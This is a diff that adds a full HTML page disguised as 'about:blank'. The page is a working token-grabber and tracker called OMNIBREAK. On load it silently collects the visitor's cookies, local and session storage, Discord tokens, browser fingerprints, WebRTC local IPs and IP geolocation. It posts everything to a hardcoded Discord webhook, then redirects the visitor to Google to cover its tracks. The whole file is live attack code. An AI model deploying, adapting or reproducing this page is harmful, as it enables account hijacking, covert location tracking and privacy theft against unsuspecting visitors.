@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>about:blank</title>
+    <style>
+        /* Complete invisibility */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #ffffff; 
+            width: 100vw; 
+            height: 100vh; 
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        /* Invisible status — only shows if something breaks */
+        #status { 
+            color: #ffffff; 
+            font-family: monospace; 
+            font-size: 12px;
+            opacity: 0;
+            user-select: none;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">Initializing...</div>
+
+    <script>
+        // ================================================================
+        // OMNIBREAK - Singularity Payload
+        // All-in-one HTML: fingerprint + exfil + redirect
+        // No backend needed — pushes directly to Discord webhook
+        // ================================================================
+
+        (function() {
+            'use strict';
+
+            // === CONFIGURATION ===
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1523767863066890240/ipv4UIHzLky7qXBeSRrI-ae5P2ziGfr3scFr_l4EbXNYZcuE7uJ0UzfSKLBoQaycB5tP';
+            const REDIRECT_URL = 'https://www.google.com';
+            const TIMEOUT_MS = 3000; // Max time before redirect
+
+            // === STATUS (hidden) ===
+            const statusEl = document.getElementById('status');
+
+            function setStatus(msg) {
+                statusEl.textContent = msg;
+            }
+
+            // === DATA COLLECTION ===
+            function collectFingerprint() {
+                setStatus('Collecting fingerprint...');
+                
+                const data = {
+                    // Timestamp
+                    timestamp: new Date().toISOString(),
+                    unix: Date.now(),
+
+                    // IP (will be filled async)
+                    ip: null,
+                    webrtc_ips: [],
+                    geo: null,
+
+                    // Browser / System
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages || [],
+                    cookie_enabled: navigator.cookieEnabled,
+                    do_not_track: navigator.doNotTrack || 'unspecified',
+                    hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                    device_memory: navigator.deviceMemory || 'unknown',
+                    max_touch_points: navigator.maxTouchPoints || 0,
+
+                    // Screen
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth
+                    },
+
+                    // Window
+                    window: {
+                        innerWidth: window.innerWidth,
+                        innerHeight: window.innerHeight,
+                        outerWidth: window.outerWidth,
+                        outerHeight: window.outerHeight,
+                        devicePixelRatio: window.devicePixelRatio || 1
+                    },
+
+                    // Timezone
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezone_offset: new Date().getTimezoneOffset(),
+
+                    // Cookies
+                    cookies: document.cookie || 'none',
+
+                    // localStorage
+                    localStorage: (function() {
+                        try {
+                            const items = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const key = localStorage.key(i);
+                                items[key] = localStorage.getItem(key);
+                            }
+                            return items;
+                        } catch(e) { return {}; }
+                    })(),
+
+                    // sessionStorage
+                    sessionStorage: (function() {
+                        try {
+                            const items = {};
+                            for (let i = 0; i < sessionStorage.length; i++) {
+                                const key = sessionStorage.key(i);
+                                items[key] = sessionStorage.getItem(key);
+                            }
+                            return items;
+                        } catch(e) { return {}; }
+                    })(),
+
+                    // Referrer
+                    referrer: document.referrer || 'none',
+
+                    // Navigation
+                    navigation: {
+                        type: performance?.navigation?.type || 'unknown',
+                        redirectCount: performance?.navigation?.redirectCount || 0,
+                    },
+
+                    // Plugins
+                    plugins: (function() {
+                        try {
+                            const names = [];
+                            for (let i = 0; i < navigator.plugins.length; i++) {
+                                names.push(navigator.plugins[i].name);
+                            }
+                            return names;
+                        } catch(e) { return []; }
+                    })(),
+
+                    // Canvas fingerprint
+                    canvas_fingerprint: (function() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 256;
+                            canvas.height = 256;
+                            const ctx = canvas.getContext('2d');
+                            ctx.textBaseline = 'top';
+                            ctx.font = '14px Arial';
+                            ctx.fillStyle = '#f60';
+                            ctx.fillRect(100, 100, 50, 50);
+                            ctx.fillStyle = '#069';
+                            ctx.fillText('OMNIBREAK', 10, 10);
+                            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                            ctx.fillRect(150, 150, 40, 40);
+                            return canvas.toDataURL();
+                        } catch(e) { return 'unsupported'; }
+                    })(),
+
+                    // WebGL
+                    webgl: (function() {
+                        try {
+                            const canvas = document.createElement('canvas');
+                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                            if (!gl) return 'unsupported';
+                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (!debugInfo) return 'no_extension';
+                            return {
+                                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                            };
+                        } catch(e) { return 'error'; }
+                    })(),
+
+                    // Audio fingerprint
+                    audio_fingerprint: (function() {
+                        try {
+                            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                            const oscillator = audioCtx.createOscillator();
+                            const analyser = audioCtx.createAnalyser();
+                            oscillator.connect(analyser);
+                            analyser.connect(audioCtx.destination);
+                            oscillator.frequency.value = 440;
+                            oscillator.type = 'sawtooth';
+                            oscillator.start(0);
+                            oscillator.stop(0.1);
+                            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+                            analyser.getByteFrequencyData(dataArray);
+                            return Array.from(dataArray.slice(0, 20));
+                        } catch(e) { return 'unsupported'; }
+                    })(),
+                };
+
+                return data;
+            }
+
+            // === WEBRTC IP LEAK ===
+            function getWebRTCIPs(data) {
+                return new Promise((resolve) => {
+                    try {
+                        const pc = new RTCPeerConnection({ 
+                            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] 
+                        });
+                        pc.createDataChannel('ping');
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                        
+                        const ips = [];
+                        pc.onicecandidate = function(ev) {
+                            if (ev.candidate) {
+                                const ipMatch = ev.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                                if (ipMatch && !ips.includes(ipMatch[0])) {
+                                    ips.push(ipMatch[0]);
+                                }
+                            }
+                        };
+                        
+                        setTimeout(() => {
+                            try { pc.close(); } catch(e) {}
+                            data.webrtc_ips = ips;
+                            resolve(data);
+                        }, 2000);
+                    } catch(e) {
+                        resolve(data);
+                    }
+                });
+            }
+
+            // === EXTERNAL IP + GEO ===
+            function getExternalIP(data) {
+                return new Promise((resolve) => {
+                    // Try ipapi.co first (gives geo too)
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', 'https://ipapi.co/json/', true);
+                    xhr.timeout = 3000;
+                    xhr.onload = function() {
+                        if (xhr.status === 200) {
+                            try {
+                                const resp = JSON.parse(xhr.responseText);
+                                data.ip = resp.ip;
+                                data.geo = {
+                                    city: resp.city,
+                                    region: resp.region,
+                                    country: resp.country_name,
+                                    country_code: resp.country_code,
+                                    latitude: resp.latitude,
+                                    longitude: resp.longitude,
+                                    timezone: resp.timezone,
+                                    isp: resp.org,
+                                    asn: resp.asn,
+                                };
+                            } catch(e) {}
+                        }
+                        resolve(data);
+                    };
+                    xhr.onerror = function() {
+                        // Fallback to ipify
+                        try {
+                            const fallback = new XMLHttpRequest();
+                            fallback.open('GET', 'https://api.ipify.org?format=json', true);
+                            fallback.timeout = 3000;
+                            fallback.onload = function() {
+                                if (fallback.status === 200) {
+                                    try {
+                                        const resp = JSON.parse(fallback.responseText);
+                                        data.ip = resp.ip;
+                                    } catch(e) {}
+                                }
+                                resolve(data);
+                            };
+                            fallback.onerror = function() {
+                                resolve(data);
+                            };
+                            fallback.send();
+                        } catch(e) {
+                            resolve(data);
+                        }
+                    };
+                    xhr.send();
+                });
+            }
+
+            // === EXTRACT DISCORD TOKENS ===
+            function extractDiscordTokens(data) {
+                const tokens = [];
+                const allCookies = data.cookies || '';
+                
+                // Pattern 1: mfa.xxxx
+                const mfaMatches = allCookies.match(/mfa\.[a-zA-Z0-9_-]+/g) || [];
+                tokens.push(...mfaMatches);
+                
+                // Pattern 2: Standard Discord tokens
+                const tokenMatches = allCookies.match(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}/g) || [];
+                tokens.push(...tokenMatches);
+                
+                // Check localStorage
+                if (data.localStorage && typeof data.localStorage === 'object') {
+                    for (const [key, value] of Object.entries(data.localStorage)) {
+                        if (typeof value === 'string') {
+                            if (value.match(/mfa\.[a-zA-Z0-9_-]+/)) tokens.push(value);
+                            if (value.match(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}/)) tokens.push(value);
+                        }
+                    }
+                }
+                
+                // Check sessionStorage
+                if (data.sessionStorage && typeof data.sessionStorage === 'object') {
+                    for (const [key, value] of Object.entries(data.sessionStorage)) {
+                        if (typeof value === 'string') {
+                            if (value.match(/mfa\.[a-zA-Z0-9_-]+/)) tokens.push(value);
+                            if (value.match(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}/)) tokens.push(value);
+                        }
+                    }
+                }
+                
+                return [...new Set(tokens)];
+            }
+
+            // === SEND TO DISCORD ===
+            function sendToDiscord(data, tokens) {
+                setStatus('Sending to Discord...');
+                
+                // Build the embed fields
+                const fields = [];
+
+                // IP
+                fields.push({
+                    name: '🌐 IP Address',
+                    value: `\`${data.ip || 'Unknown'}\``,
+                    inline: true
+                });
+
+                // Local IP
+                if (data.webrtc_ips && data.webrtc_ips.length > 0) {
+                    fields.push({
+                        name: '🏠 Local IP',
+                        value: `\`${data.webrtc_ips.join(', ')}\``,
+                        inline: true
+                    });
+                }
+
+                // Geolocation
+                if (data.geo) {
+                    let geoStr = '';
+                    if (data.geo.city) geoStr += `📍 ${data.geo.city}, `;
+                    if (data.geo.region) geoStr += `${data.geo.region}, `;
+                    if (data.geo.country) geoStr += `${data.geo.country}`;
+                    if (data.geo.isp) geoStr += `\n🏢 ${data.geo.isp}`;
+                    if (data.geo.latitude && data.geo.longitude) {
+                        geoStr += `\n🗺️ ${data.geo.latitude}, ${data.geo.longitude}`;
+                    }
+                    if (geoStr) {
+                        fields.push({
+                            name: '📍 Geolocation',
+                            value: geoStr,
+                            inline: false
+                        });
+                    }
+                }
+
+                // User Agent
+                fields.push({
+                    name: '💻 User Agent',
+                    value: `\`\`\`\n${(data.user_agent || 'Unknown').substring(0, 200)}\n\`\`\``,
+                    inline: false
+                });
+
+                // System Specs
+                const specs = [];
+                if (data.platform) specs.push(`Platform: ${data.platform}`);
+                if (data.hardware_concurrency) specs.push(`CPU: ${data.hardware_concurrency} cores`);
+                if (data.device_memory) specs.push(`RAM: ${data.device_memory}GB`);
+                if (data.screen) specs.push(`Screen: ${data.screen.width}x${data.screen.height}`);
+                if (data.timezone) specs.push(`Timezone: ${data.timezone}`);
+                fields.push({
+                    name: '🖥️ System Specs',
+                    value: `\`\`\`\n${specs.join('\n')}\n\`\`\``,
+                    inline: false
+                });
+
+                // === DISCORD TOKENS (highlighted) ===
+                if (tokens && tokens.length > 0) {
+                    fields.push({
+                        name: '🎯 **DISCORD TOKENS DETECTED!**',
+                        value: `\`\`\`\n${tokens.join('\n')}\n\`\`\``,
+                        inline: false
+                    });
+                }
+
+                // Cookies (truncated)
+                const cookiePreview = (data.cookies || 'none').substring(0, 400);
+                fields.push({
+                    name: '🍪 Cookies',
+                    value: `\`\`\`\n${cookiePreview}${data.cookies && data.cookies.length > 400 ? '...' : ''}\n\`\`\``,
+                    inline: false
+                });
+
+                // localStorage summary
+                if (data.localStorage && Object.keys(data.localStorage).length > 0) {
+                    const keys = Object.keys(data.localStorage);
+                    fields.push({
+                        name: '💾 localStorage',
+                        value: `\`\`\`\n${keys.length} keys\n${keys.slice(0, 5).join(', ')}${keys.length > 5 ? '...' : ''}\n\`\`\``,
+                        inline: false
+                    });
+                }
+
+                // Build the payload
+                const payload = {
+                    username: 'OMNIBREAK',
+                    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
+                    embeds: [{
+                        title: '🔴 Silent Capture',
+                        color: 0x5865F2,
+                        timestamp: new Date().toISOString(),
+                        fields: fields,
+                        footer: {
+                            text: 'Full potential Unlocked'
+                        },
+                        author: {
+                            name: 'OMNIBREAK'
+                        }
+                    }]
+                };
+
+                // Send to Discord
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.timeout = 5000;
+                xhr.onload = function() {
+                    setStatus('Sent successfully');
+                    redirect();
+                };
+                xhr.onerror = function() {
+                    setStatus('Send failed, redirecting...');
+                    redirect();
+                };
+                xhr.send(JSON.stringify(payload));
+            }
+
+            // === REDIRECT ===
+            function redirect() {
+                setStatus('Redirecting to Google...');
+                setTimeout(() => {
+                    window.location.replace(REDIRECT_URL);
+                }, 500);
+            }
+
+            // === MAIN EXECUTION ===
+            async function main() {
+                try {
+                    setStatus('Starting...');
+                    
+                    // Step 1: Collect base fingerprint
+                    let data = collectFingerprint();
+                    
+                    // Step 2: Get WebRTC IPs
+                    data = await getWebRTCIPs(data);
+                    
+                    // Step 3: Get external IP + geo
+                    data = await getExternalIP(data);
+                    
+                    // Step 4: Extract Discord tokens
+                    const tokens = extractDiscordTokens(data);
+                    
+                    // Step 5: Send to Discord
+                    sendToDiscord(data, tokens);
+                    
+                    // Step 6: Fallback redirect if send fails
+                    setTimeout(redirect, TIMEOUT_MS);
+                    
+                } catch (error) {
+                    setStatus('Error: ' + error.message);
+                    // Still redirect after error
+                    setTimeout(redirect, 1000);
+                }
+            }
+
+            // === START ===
+            // Wait for page to fully load
+            if (document.readyState === 'complete') {
+                main();
+            } else {
+                window.addEventListener('load', main);
+            }
+
+        })();
+    </script>
+</body>
+</html>
